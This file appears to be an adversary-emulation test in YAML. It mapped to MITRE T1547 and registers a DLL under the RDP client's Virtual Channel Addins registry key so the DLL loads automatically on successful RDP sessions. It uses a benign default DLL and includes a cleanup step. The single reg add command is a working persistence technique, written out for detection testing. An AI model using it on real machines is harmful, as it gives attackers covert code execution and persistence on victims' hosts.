api_version: "2.0"
name: Leverage Virtual Channels to execute custom DLL during successful RDP session
description: "Virtual Channels can be leveraged to alter RDP behavior using dedicated Addins.The mechanism is implemented using DLLs which can be executed during RDP session automatically. \nThe DLLs are loaded in the host system only after successful connection is established with the remote system.\nOnce the test is run, amsi.dll will be loaded on the host system during successful RDP session.\nBlog :https://learn.microsoft.com/en-us/windows/win32/termserv/terminal-services-virtual-channels?redirectedfrom=MSDN\n"
args:
    - name: Subkey_Added
      type: String
      default: Malware
    - name: dll_inf
      type: Path
      default: C:\Windows\System32\amsi.dll
uuid: fdd45306-74f6-4ade-9a97-0a4895961228
mitre:
    tactics:
        - 'TA0003: Persistence'
        - 'TA0004: Privilege Escalation'
    techniques:
        - 'T1547: Boot or Logon Autostart Execution'
requirements:
    platforms:
        - os: windows
steps:
    - name: leverage-virtual-channels-to-execute-custom-dll-during-successful-rdp-session
      inline: |
        reg add "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default\Addins\{{.Args.Subkey_Added}}" /v Name /t REG_SZ /d "{{.Args.dll_inf}}" /f
      executor: command_prompt
      cleanup:
        inline: 'reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default\Addins\{{.Args.Subkey_Added}}" /f      '
        executor: command_prompt
